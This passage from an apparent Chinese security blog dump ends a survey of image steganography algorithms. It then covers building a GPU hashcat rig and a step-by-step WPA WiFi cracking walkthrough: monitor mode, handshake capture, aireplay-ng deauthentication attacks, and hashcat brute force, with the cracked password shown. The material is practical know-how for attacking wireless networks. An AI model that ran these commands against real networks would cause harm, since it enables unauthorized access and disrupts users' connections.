\\mathrm{j}}\\right)$和实际计算中使用到的编码算法，因此，我们可以设计出更好的编码或使用更好的图像模型使最终隐写算法的性能、安全性、抗分析能力最优。需要注意的是，最小化嵌入失真的过程还有一个重要的步骤，就是隐写编码，隐藏信息就是通过隐写编码嵌入到载体图像中。\n\n3. 隐写编码算法\n经过上述步骤，在已知失真函数的情况下，隐写编码算法可以动态调整失真函数，使嵌入秘密信息后载密图像的统计特征无限接近于原始图像（载体图像）。其中，Filler提出的STC（Syndrome-Trellis Codes）是一种二元隐写编码[19]，STC编码奠定了隐写编码算法的研究基础，很多研究者在此基础上改进或融合了STC编码。此外，早期湿纸编码[22]也非常流行。\n\n### 0x32 基于视觉效果的隐写算法\n在早期自适应隐写方向，隐写研究者最开始想到的是在载体图像纹理丰富的区域嵌入隐秘信息，因其纹理复杂，会被观察者误认为是噪点而忽略掉，难以观察出来，具有较强的隐蔽性。基于这个出发点，Kawaguchi E.等人提出了基于位平面的复杂段分割隐写算法（Bit-Plane Complexity Segmentation，BPCS）[23]，该算法提出：将载体图像的位面和待隐藏信息分割成大小相同的位面块，随后将载体图像的低复杂度位面小块与待隐藏的信息替换以隐藏信息。这种算法简单高效，却容易被分析。基于BPCS算法，Da-Chun Wu等人提出了改进的基于像素插值的视觉隐蔽算法PVD（Pixel Value Difference）[24]，该算法将载体图像分割大小相同的互不重叠的像素方块，根据分割出来的像素块之间的差值来确定嵌入的隐秘信息的多少，如果像素块之间的差值越大，说明纹理越复杂，视觉干扰越明显，则可以嵌入越多的隐秘信息。BPCS和PVD算法都是基于视觉效果进行信息隐藏的算法，具有良好的视觉隐蔽性，但是在抗隐写分析算法的性能上却非常低效。学者为了提高自适应算法的抗分析能力，尝试了多种方法，如今主流、有效的方法是基于最小化统计的隐写方法[25][26][27]和基于最小加性失真模型的隐写方法[28]。后者在学术界得到了更广泛的发展，并且衍生出大量高质的自适应隐写算法。\n\n### 0x33 空域自适应隐写算法\n为了避免基于视觉效果的信息隐藏算法中的安全性问题，研究者提出了在空间域实现隐写的方法，这些方法大都基于“嵌入失真函数+STC编码技术”架构[29]实现空域隐写，文献[29]首次提出基于该架构的空域自适应隐写算法——（Highly Undetectable setGO）HUGO算法，将自适应隐写算法从基于视觉隐藏算法中的研究方向转移到基于空域图像隐写算法的方向中去，极大地提高了自适应隐写算法地安全性和抗分析能力。在载体图像的灰度共生矩阵提取特征时，HUGO算法将其提取像素地阈值设为T=90，因此载密图像在像素值为[80,93]区间的像素个数发生了明显变化，很容易被统计攻击，极大降低了自适应算法的安全性。为了解决这个问题，Jan Kodovsky等人提出将HUGO算法的阈值设为T=255[30]，即为HUGO255。为了进一步提高类HUGO算法在高嵌入率情况下的安全性，Fridrich在文献[25]中提出MG（Multivariate Gaussian）算法，该算法利用不同分布但相互独立的量化多元高斯模型对载体图像进行建模，通过载体对象（Cover）和载密对象（Stego）最小化KL散度（Kullback Leibler），以生成嵌入失真函数，此外还利用拉格朗日乘子法推导出给定载荷和图像的最优嵌入变化概率。相较于HUGO隐写算法，MG隐写算法对于大于0.3bpp的有效载荷具有更强的安全性；但对于较小的有效载荷，HUGO相对安全一点。文献[31]提出在空间域定义加性隐写失真的WOW方法，该方法在改变一个像素之后，对方向高通滤波器输出的变化加权，随后用Holder范数的倒数聚合，来定义单个像素的成本。\n\nHUGO、MG、WOW隐写算法利用最优搜索保持载密图像与载体图像高阶的统计特性，因此提高了抗统计分析的能力，安全性高于一般的隐写算法。Vojtěch Holub等人为了进一步改进WOW算法，提出了一种测量固定于中的嵌入失真的新方法，该方法独立于嵌入变化（和编码）所在的域，通过Daubechies小波滤波器组获得的方向残差来评估图像元素（如：像素或DCT系数）的改变值。简单来说，就是将嵌入更改限制在那些难以在多个方向建模的区域，同时避免对光滑区域和平滑的边缘进行隐写，由此衍生成（UNIversal WAvelet Relative Distortion，UNIWARD）通用小波相对失真系列的隐写算法。此外，基于空域的自适应隐写算法还有SUNIWARD（Spatial UNIWARD）隐写算法、HILL（HIgh-pass, Low-pass, and Low-pass）隐写算法[32]、MiPOD（Minimizing the Power of Optimal Detector）隐写算法[27]等。这些算法的核心思想是：基于复杂度优先的原则对元素进行更改，简而言之，载体图像区域嵌入的失真小，则被嵌入隐秘信息的概率大，反之，被嵌入隐秘信息的概率小。基于这一思想Li Bin等人提出cost-value分布的思想，结合了扩散原则（Spreading Rule）和聚合原则（Clustering Rule）进一步优化选取图片元素的策略。\n\n值得注意的是，上述算法的嵌入失真都是加性的嵌入失真，而文献[33]提出了一个通过定义联合失真像素块、基于非加性失真隐写的框架。为了降低最小化联合失真函数的复杂度，该文献提出Dejoin（Decomposing Joint distortion）隐写算法[33]，该方法证明了非加性失真嵌入函数在隐写中的可行性。\n\n### 0x34 JPEG域自适应隐写算法\n\nFridrich等人最早在2005年提出一种新的JPEG自适应隐写算法——扰动量化算法[34]。该算法使用量化取整误差的方法来构造嵌入失真函数，该方法使用湿纸编码，在DCT系数取整时，干扰其取整方向以嵌入秘密信息。基于[18]和[34]两种算法，出现了MMe（Modified Matrix Encoding）和PQ（Perturbed Quantization）隐写算法，这两种算法是早期的JPEG自适应隐写算法的代表，其核心架构是“嵌入失真函数+隐写编码算法”。为了进一步改进PQ算法，文献[10]提出了PQe（PQ energy-adaptive）和PQt（PQ texture-adaptive） 隐写算法，这两种算法既融合DCT系数量化取整误差的思想，又考虑了DCT系数各个分块的能量大小和纹理复杂度，明显提升了PQ算法的性能。为了进一步提高JPEG隐写的安全性，Huang F.等人提出NPQ（Normalized PQ）隐写算法[35]，该算法提出了新的信道选择规则，该规则可用于寻找最小的可检测失真的DCT系数。类似于SUNIWARD空域自适应隐写算法，文献[36]提出适用于变换域的JPEG图像隐写算法和Slide Informed UNIWARD（SIUNIWARD）隐写算法。为了让隐写算法可以抗空域和变换域隐写分析的能力，Wang Z.等人提出Hybrid隐写算法，该算法基于DCT系数量化步长和像素块差值，嵌入效率明显高于JUNIWARD隐写算法。此外，还有早期的EBS（Entryopy Block Steganography）隐写算法[37]，能够抵抗高维检测攻击；UED（Uniform Embedding  Distortion）系列算法——UED-SC （UED based on Single Coefficient）、UED-JC（UED based on Joint Coefficients）、SI-UED（Side Informed UED）[38],[39]，基于载体图像DCT系数块内、块间相邻系数生成相应的嵌入失真函数，具有较强的抗检测性优势。\n\n## 0x40 总结\n本章介绍空域隐写算法时，从最简单的LSB隐写原理开始介绍，之后再详细列举了LSB隐写的变种及随即调制、有限调色板隐写等方法；介绍变换域隐写算法时，先从JPEG压缩的原理出发，介绍了其流程，然后解释基于DCT的多种变换域隐写的方法；介绍自适应隐写算法时，则先介绍了自适应隐写算法的基本概念及公式，然后基于这些概念展开阐述各种自适应隐写算法的核心思想。\n\n## 0x50 参考文献\n> [1] Zhang T, Ping X J. Reliable Detection of Spatial LSB Steganography Based on Difference Histogram[J]. Journal of Software, 2004, 15(1):151-158.\n[2] Fridrich J , Goljan M , Du R . Detecting LSB steganography in color, and gray-scale images[J]. IEEE Multimedia, 2001, 8(4):22-28.\n[3] Westfeld A, Pfitzmann A. Attacks on Steganographic Systems[C] International Workshop on Information Hiding. Springer-Verlag, 1999.\n[4] Mielikainen, J. LSB matching revisited[J]. IEEE Signal Processing Letters, 2006, 13(5):285-287.\n[5] Li X , Yang B , Cheng D , et al. A Generalization of LSB Matching[J]. IEEE Signal Processing Letters, 2009, 16(2):69-72.\n[6] Fridrich J , Goljan M . Digital image steganography using stochastic modulation[J]. Proceedings of SPIE - The International Society for Optical Engineering, 2003, 5020(4):191--202.\n[7] Marvel L M , Retter C T , Boncelet C G . Hiding Information in Images.[C]// International Conference on Image Processing. IEEE, 1998.\n[8] Pennebaker W B , Mitchell J L . JPEG still image data compression standard[M]. Van Nostrand Reinhold, 1992.\n[9] Westfeld A . F5—A Steganographic Algorithm[M]// Information Hiding. Springer Berlin Heidelberg, 2001.\n[10] Fridrich J . Statistically undetectable jpeg steganography:dead ends challenges, and opportunities[C]// Workshop on Multimedia & Security. DBLP, 2007.\n[11] Provos N . Defending Against Statistical Steganalysis[C]// Conference on Usenix Security Symposium. USENIX Association, 2001.\n[12] Sallee P . Model-Based Steganography[C]// International Workshop on Digital Watermarking. Springer, Berlin, Heidelberg, 2003.\n[13] Sallee P. MODEL-BASED METHODS FOR STEGANOGRAPHY AND STEGANALYSIS[J]. International Journal of Image and Graphics, 2005, 5(01):23.\n[14] Fridrich J ,  Goljan M ,  Lisonek P , et al. Writing on wet paper[J]. IEEE Transactions on Signal Processing, 2005, 53(10):3923-3935.\n[15] Zhang W ,  Wang S ,  Zhang X . Improving Embedding Efficiency of Covering Codes for Applications in Steganography[J]. IEEE Communications Letters, 2007, 11(8):680-682.\n[16] Zhang W ,  Zhu X . Improving the Embedding Efficiency of Wet Paper Codes by Paper Folding[J]. IEEE Signal Processing Letters, 2009, 16(9):794-797.\n[17] Zhang W ,  Wang X . Generalization of the ZZW Embedding Construction for Steganography[J]. IEEE Transactions on Information Forensics and Security, 2009, 4(3):564-569.\n[18] Kim Y , Duric Z , Richards D . Modified Matrix Encoding Technique for Minimal Distortion Steganography[J]. 2006.\n[19] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011.\n[20] 刘华, 汤光明. 一种融合湿纸码和STC码的高效隐写算法[J]. 计算机应用研究, 2012, 29(6).\n[21] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.\n[22] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110.\n[23] Kawaguchi E, Eason R O. Principles and applications of BPCS steganography[C]// Photonics East. International Society for Optics and Photonics, 1999.\n[24] Wu D C , Tsai W H . A steganographic method for images by pixel-value differencing[J]. Pattern Recognition Letters, 2003, 24(9-10):1613-1626.\n[25] Fridrich J , Jan Kodovský. MULTIVARIATE GAUSSIAN MODEL FOR DESIGNING ADDITIVE DISTORTION FOR STEGANOGRAPHY[C]// IEEE International Conference on Acoustics. IEEE, 2013.\n[26] Alattar A M ,  Memon N D ,  Heitzenrater C D , et al. SPIE Proceedings [SPIE IS&T/SPIE Electronic Imaging - San Francisco, California, United States (Sunday 8 February 2015)] Media Watermarking, Security, and Forensics 2015 - Content-adaptive pentary steganography using the multivariate generalized Gaussian cover model[J].  2015, 9409:94090H.\n[27] Sedighi V ,  Cogranne R ,  Fridrich J . Content-Adaptive Steganography by Minimizing Statistical Detectability[J]. IEEE Transactions on Information Forensics and Security, 2015:1-1.\n[28] Fridrich J ,  Filler T . Practical methods for minimizing embedding impact in steganography[C]// Electronic Imaging. International Society for Optics and Photonics, 2007.\n[29] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.\n[30] Kodovsky J , Fridrich J , Holub V . On dangers of overtraining steganography to incomplete cover model[C]// Acm Multimedia & Security Workshop. ACM, 2011.\n[31] Holub V , Fridrich J J . Designing steganographic distortion using directional filters.[C]// IEEE International Workshop on Information Forensics & Security. IEEE, 2012.\n[32] Li B , Wang M , Huang J , et al. A new cost function for spatial image steganography[C]// 2014 IEEE International Conference on Image Processing (ICIP). IEEE, 2015.\n[33] Zhang W , Zhang Z , Zhang L , et al. Decomposing Joint Distortion for Adaptive Steganography[J]. IEEE Transactions on Circuits and Systems for Video Technology, 2016:1-1.\n[34] Fridrich J , Goljan M , Soukal D . Perturbed quantization steganography[J]. Multimedia Systems, 2005, 11(2):98-107.\n[35] Huang F , Huang J , Shi Y Q . New Channel Selection Rule for JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2012, 7(4):1181---1191.\n[36] Holub, Vojtěch, Fridrich J . [ACM Press the first ACM workshop - Montpellier, France (2013.06.17-2013.06.19)] Proceedings of the first ACM workshop on Information hiding and multimedia security - IH&MMSec \\\"13 - Digital image steganography using universal distortion[J]. 2013:59.\n[37] Wang C , Ni J . An efficient JPEG steganographic scheme based on the block entropy of DCT coefficients[C]// IEEE International Conference on Acoustics. IEEE, 2012.\n[38] Guo L , Ni J , Shi Y Q . An efficient JPEG steganographic scheme using uniform embedding[C]// Information Forensics and Security (WIFS), 2012 IEEE International Workshop on. IEEE, 2012.\n[39] Guo L , Ni J , Shi Y Q . Uniform Embedding for Efficient JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2014, 9(5):814-825.\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"Ubuntu18.04+8x1080ti爆破环境从零搭建","date":"2018-10-24T12:20:38.498Z","path":"2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/","raw":"---\ntitle: Ubuntu18.04+8x1080ti爆破环境从零搭建\ndate: \ncategories:\ntoc: ture\ntags:\n\t- Wireless\ncomments: true\n---\n\n>\n> 硬件环境:\n>\n> 主机: TYAN FT77D-B7109\n>\n> CPU: Intel Xeon Scalable Processor\n>\n> GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉)\n>\n> 内存: 32G\n>\n> 硬盘: 1T SSD\n\n<!-- more -->\n\n## 0x00 配置环境\n\n### 0x01 安装系统\n\n> 目标系统: [Ubuntu 18.04.1 LTS Desktop](https://www.ubuntu.com/download/desktop) (建议安装Server版)\n\n在官网下载好启动盘之后, 用烧录工具(建议用[win32diskimager](https://sourceforge.net/projects/win32diskimager/))写入U盘, 然后进入启动项选为U盘启动, 接下来开始安装, 一路默认配置就好. 具体步骤请谷歌, 这里就不赘述了. (这里我们遇到一个坑, 就是插了PCIE网卡之后安装系统一直重启, 可能是主机的兼容性问题, 装系统的时候如果条件允许, 最好把所有的外置设备卸载掉)\n\n\n\n### 0x02 安装GPU驱动\n\n1. 安装好系统之后, 可以配置一下更新源(`/etc/apt/sources.list`,我用的是中科大源), update一下系统. \n\n   ```\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n   ```\n\n   ```bash\n   sudo apt-get update && apt-get upgrade\n   sudo apt-get install gcc make p7zip-full git lsb-core\n   ```\n\n2. 然后将Nouveau(NVIDIA通用显卡驱动)禁用:\n\n   ```bash\n   sudo bash -c \"echo blacklist nouveau > /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n   sudo bash -c \"echo options nouveau modeset=0 >> /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n   sudo update-initramfs -u\n   sudo reboot\n   ```\n\n3. 等重启之后, 再添加32位的NVIDIA驱动源:\n\n   ```bash\n   sudo dpkg --add-architecture i386\n   sudo apt-get update\n   sudo apt-get install build-essential libc6:i386\n   ```\n\n4. 在官网下载[驱动](http://www.nvidia.com/Download/index.aspx), 下载好之后:\n\n   ```bash\n   chmod +x NVIDIA*.run\n   sudo ./NVIDIA*.run\n   sudo reboot\n   ```\n\n   或者:\n\n   ```bash\n   wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run\n   chmod +x NVIDIA-Linux-x86_64-375.26.run\n   sudo ./NVIDIA-Linux-x86_64-375.26.run\n   ```\n\n5. (可选步骤)安装CPU集成显卡驱动:\n\n   ```bash\n   wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz\n   tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz\n   cd opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25\n   ./install.sh \n   ```\n\n6. 这时候可以看一下显卡配置:\n\n   ```\n   lspci | grep VGA\n   ```\n\n\n\n### 0x03 安装hashcat\n\n```bash\nwget https://hashcat.net/files/hashcat-3.30.7z\n7z x hashcat-3.30.7z\ncd hashcat-3.30\n```\n\n这是个比较老的版本, 我用的aircrack跑出来的包用这个版本可以跑. 如果想尝一下鲜也可以:\n\n```bash\nwget https://hashcat.net/files/hashcat-4.2.1.7z\n```\n\n顺便测试一下速度(在解压后的目录里直接运行`./example0.sh`即可):\n\n```bash\nSession..........: hashcat\nStatus...........: Bypass\nHash.Type........: MD5\nHash.Target......: example0.hash\nTime.Started.....: Sat Oct 20 20:08:33 2018 (27 mins, 0 secs)\nTime.Estimated...: Sat Oct 20 22:31:24 2018 (1 hour, 55 mins)\nGuess.Base.......: File (example.dict), Right Side\nGuess.Mod........: Mask (?a?a?a?a?a?a) [6], Left Side\nGuess.Queue.Base.: 1/1 (100.00%)\nGuess.Queue.Mod..: 1/1 (100.00%)\nSpeed.Dev.#2.....:  8340.3 MH/s (6.61ms) @ Accel:128 Loops:64 Thr:256 Vec:1\nSpeed.Dev.#3.....:  7938.7 MH/s (6.93ms) @ Accel:128 Loops:64 Thr:256 Vec:1\nSpeed.Dev.#*.....: 16279.0 MH/s\nRecovered........: 3035/6494 (46.74%) Digests, 0/1 (0.00%) Salts\nRecovered/Time...: CUR:25,N/A,N/A AVG:29,1773,42558 (Min,Hour,Day)\nProgress.........: 26411945426944/139573552218112 (18.92%)\nRejected.........: 0/26411945426944 (0.00%)\nRestore.Point....: 200933376/1073741824 (18.71%)\nCandidates.#2....: sarusix102x -> 6o9momx49wy3c2\nCandidates.#3....: sarseeethelia3 -> 6o9602eugeni\nHWMon.Dev.#2.....: Temp: 79c Fan: 62% Util: 94% Core:1860MHz Mem:5005MHz Bus:16\nHWMon.Dev.#3.....: Temp: 84c Fan: 78% Util: 94% Core:1771MHz Mem:5005MHz Bus:16\n\nStarted: Sat Oct 20 20:08:26 2018\nStopped: Sat Oct 20 20:35:35 2018\n```\n\n- 关于上面输出的参数解析:\n\n\n  ```bash\n  实际上example0.sh的命令如下:\n  ./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict\n  \n  Session..........:\n  Status...........: \n  Hash.Type........: 表示哈希计算的类型\n  Hash.Target......: 表示目标哈希表\n  Time.Started.....: 计算开始时间\n  Time.Estimated...: 估计结束时间\n  Guess.Base.......: 密码字典\n  Guess.Mod........: 密码类型(大小写/数字等)\n  Guess.Queue.Base.:\n  Guess.Queue.Mod..:\n  Speed.Dev.#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)\n  Speed.Dev.#3.....: 显卡2...\n  Speed.Dev.#*.....: 总速度\n  Recovered........: \n  Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)\n  Progress.........: 当前进度\n  Rejected.........: 应该是丢包率(猜的)\n  Restore.Point....: 当前的进度\n  Candidates.#2....: 即将尝试爆破的密码(猜的)\n  Candidates.#3....: \n  HWMon.Dev.#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率\n  HWMon.Dev.#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数\n  ```\n\n- 关于hashcat命令参数解析(详见[附录一](#附录一)):\n\n  ```\n  -a  指定要使用的破解模式\n  -m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法\n  -o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中\n  --force\t忽略破解过程中的警告信息,跑单条hash可能需要加上此选项\n  --show\t显示已经破解的hash及该hash所对应的明文\n  --increment\t 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长\n  --increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用\n  --increment-max  密码最大长度,同上\n  --outfile-format 指定破解结果的输出格式id,一般自己常用3\n  --username \t 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到\n  --remove \t 删除已被破解成功的hash\n  -r\t\t 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的\n  ```\n\n- 真实爆破WiFi密码情况系hashcat参数解析:\n\n  ```bash\n  ./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?l?l?l?l?l?l?l?l\n  ```\n\n  > -m : hash的类型, 2500代表的是WPA/WPA2协议. 详见[② Hash种类](② Hash种类)\n  >\n  > -a: 有多种参数, 3表示穷举. 详见[⑤ 攻击模式](#⑤ 攻击模式)\n  >\n  > *.hccap: 即为`aircrack`抓到的包之后转化而来的\n  >\n  > ?l: 表示所有的小写字母. 详见[⑥ 内置字符集](⑥ 内置字符集)\n\n\n\n## 0x10 Crack实战\n\n### 0x11 初始配置\n\n1. 首先需要找一个可以监听注入的USB网卡, 如果笔记本自带网卡能用就更好了. 这里以`rt2800usb`为例讲解:\n\n   ```bash\n   root@ks:/home/ks# airmon-ng \n   PHY\tInterface\tDriver\t\tChipset\n   phy0\twlp3s0\t\tiwlwifi\t\tIntel Corporation Device 24fb (rev 10)\n   phy1\twlx7cdd90f1f416\trt2800usb\tRalink Technology, Corp. RT2870/RT3070\n   ```\n\n   可以看到, 有两张网卡, `wlp3s0`是笔记本自带的英特尔系列网卡; `lx7cdd90f1f416`是能够监听的新插入的usb网卡.\n\n2. 查看网卡状态, 两张网卡的Mode都是`Managed`:\n\n   ```bash\n   root@ks:/home/ks# iwconfig\n   wlx7cdd90f1f416  IEEE 802.11  ESSID:off/any  \n   Mode:Managed  Access Point: Not-Associated   Tx-Power=off   \n   Retry short  long limit:2   RTS thr:off   Fragment thr:off\n   Encryption key:off\n   Power Management:off\n   lo        no wireless extensions.\n   wlp3s0    IEEE 802.11  ESSID:off/any  \n   Mode:Managed  Access Point: Not-Associated   Tx-Power=off   \n   Retry short limit:7   RTS thr:off   Fragment thr:off\n   Encryption key:off\n   Power Management:on\n   enp2s0    no wireless extensions.\n   enp0s20f0u1  no wireless extensions.\n   ```\n\n3. 为了避免冲突, 先杀占用进程\n\n   ```bash\n   root@ks:/home/ks# airmon-ng check kill\n   \n   Killing these processes:\n   \n     PID Name\n     891 wpa_supplicant\n    3091 dhclient\n    4430 avahi-daemon\n    4431 avahi-daemon\n   ```\n\n4. 然后将能够抓包的网卡的Mode设为`Monitor`\n\n   ```bash\n   root@ks:/home/ks# airmon-ng start wlx7cdd90f1f416\n   \n   Found 2 processes that could cause trouble.\n   If airodump-ng, aireplay-ng or airtun-ng stops working after\n   a short period of time, you may want to run 'airmon-ng check kill'\n   \n     PID Name\n    7674 avahi-daemon\n    7675 avahi-daemon\n   \n   PHY\tInterface\tDriver\t\tChipset\n   \n   phy0\twlp3s0\t\tiwlwifi\t\tIntel Corporation Device 24fb (rev 10)\n   phy4\twlx7cdd90f1f416\trt2800usb\tRalink Technology, Corp. RT2870/RT3070\n   \twlx7cdd90f1f416 is soft blocked, please run \"rfkill unblock wlx7cdd90f1f416\" to use this interface.\n   rfkill error, unable to start wlx7cdd90f1f416\n   \n   Would you like to try and automatically resolve this? [y/n] y\n   rfkill error: rfkill: invalid identifier: 4\n   Unable to unblock.\n   Interface 15mon is too long for linux so it will be renamed to the old style (wlan#) name.\n   \n   \t\t(mac80211 monitor mode vif enabled on [phy4]wlan0mon\n   \t\t(mac80211 station mode vif disabled for [phy4]wlx7cdd90f1f416)\n   ```\n\n5. 此时再看一下无线网卡状态:\n\n   ```bash\n   root@ks:/home/ks# iwconfig\n   lo        no wireless extensions.\n   \n   wlp3s0    IEEE 802.11  ESSID:off/any  \n             Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   \n             Retry short limit:7   RTS thr:off   Fragment thr:off\n             Encryption key:off\n             Power Management:on\n             \n   wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=off   \n             Retry short  long limit:2   RTS thr:off   Fragment thr:off\n             Power Management:off\n             \n   enp2s0    no wireless extensions.\n   \n   enp0s20f0u1  no wireless extensions.\n   ```\n\n   已更改~\n\n### 0x12 实施攻击\n\n1. 我们的攻击目标是`iPhone`:\n\n   ```bash\n   root@ks:/home/ks# airodump-ng wlan0mon\n   ```\n\n   ![img](1540284494095.png)\n\n   上图可看到它的mac是` 74:D2:1D:AE:3F:94 `, 信道(CH)是`1`. (记住这两个信息下面有用)\n\n2. 接下来我们开两个shell, 一个shell负责监听握手包, 另一个shell负责洪荒攻击两个正常连接的WiFi设备, 我们先看看第一个shell:\n\n   ```bash\n   airodump-ng --bssid 74:D2:1D:AE:3F:94 -c 1 -w test wlan0mon\n   ```\n\n   ![img](1540286260611.png)\n\n   可以看出来已经抓到了握手包703个. 对命令参数解释如下:\n\n   > --bssid: 表示WiFi热点的mac\n   >\n   > -c: 表示信道1\n   >\n   > -w: 后面跟着文件名\n   >\n   > wlan0mon: 需要监听的网卡\n\n3. 开启了监听之后, 我们就需要DDoS目标连接了, 这时候在另一个shell输入如下命令:\n\n   ```bash\n   aireplay-ng --deauth 5 -a 74:D2:1D:AE:3F:94 wlan0mon\n   ```\n\n   隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.\n\n## 0x20 开始爆破\n\n在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:\n\n```bash\nroot@ks:~/crack_packet_wifi# wpaclean wpapass.cap test-05.cap \nPwning test-05.cap (1/1 100%)\nNet 74:d2:1d:ae:3f:94 iPhone\nDone\n```\n\n可以看到, 已经成功识别出目标无限的mac. 接下来我们吧数据包转换成hashcat能够识别的hash类型:\n\n```bash\nroot@ks:/home/ks/software/crack_pw/crack_packet_wifi# aircrack-ng wpapass.cap -J wpahash\nOpening wpapass.cap\nRead 3 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  74:D2:1D:AE:3F:94  iPhone                    WPA (1 handshake)\n\nChoosing first network as target.\nOpening wpapass.cap\nReading packets, please wait...\nBuilding Hashcat (1.00) file...\n[*] ESSID (length: 6): iPhone\n[*] Key version: 2\n[*] BSSID: 74:D2:1D:AE:3F:94\n[*] STA: 88:C9:D0:B7:2C:36\n[*] anonce:\n    E6 A3 D9 3C 95 77 3E 0B 5D 84 CE 65 0D 1C EB 59 \n    E4 E4 E3 A5 3A 07 FE D8 47 A1 7C 77 10 66 DC E4 \n[*] snonce:\n    03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 2A \n    4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 AD \n[*] Key MIC:\n    21 51 2B 3C 6F 37 CA 9E 09 6C 92 74 45 DC DA 11\n[*] eapol:\n    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 \n    03 03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 \n    2A 4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 \n    AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC \n    04 01 00 00 0F AC 02 80 00 \nSuccessfully written to wpahash.hccap\nQuitting aircrack-ng...\n```\n\n接下来就是直接放到爆破的服务器上跑(实测用最新版的hashcat跑不了, 这里用了3.30版本的hashcat)\n\n```bash\n./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?d?d?d?d?d?d?d?d\n```\n\n几秒钟就跑出来了:\n\n```bash\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA/WPA2\nHash.Target......: iPhone (74:d2:1d:ae:3f:94 <-> 88:c9:d0:b7:2c:36)\nTime.Started.....: Tue Oct 23 17:43:18 2018 (3 secs)\nTime.Estimated...: Tue Oct 23 17:44:52 2018 (1 min, 31 secs)\nInput.Mask.......: ?d?d?d?d?d?d?d?d [8]\nInput.Queue......: 1/1 (100.00%)\nSpeed.Dev.#2.....:   535.2 kH/s (6.23ms)\nSpeed.Dev.#3.....:   527.7 kH/s (6.34ms)\nSpeed.Dev.#*.....:  1062.9 kH/s\nRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts\nProgress.........: 2207744/100000000 (2.21%)\nRejected.........: 0/2207744 (0.00%)\nRestore.Point....: 0/10000000 (0.00%)\nCandidates.#2....: 42345678 -> 41875555\nCandidates.#3....: 40689823 -> 49471088\nHWMon.Dev.#2.....: Temp: 41c Fan: 29% Util: 97% Core:1860Mhz Mem:5005Mhz Lanes:16\nHWMon.Dev.#3.....: Temp: 41c Fan:  0% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16\n\niPhone:74d21dae3f94:88c9d0b72c36:67854312                 \n```\n\n假设我们把它设置成全字符爆破, 也就是:\n\n```bash\n./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?a?a?a?a?a?a?a?a\n```\n\n则需要几百年(可见, 如果知道WiFi密码的字符组成结构, 也就成功了一半了):\n\n```bash\nSession..........: 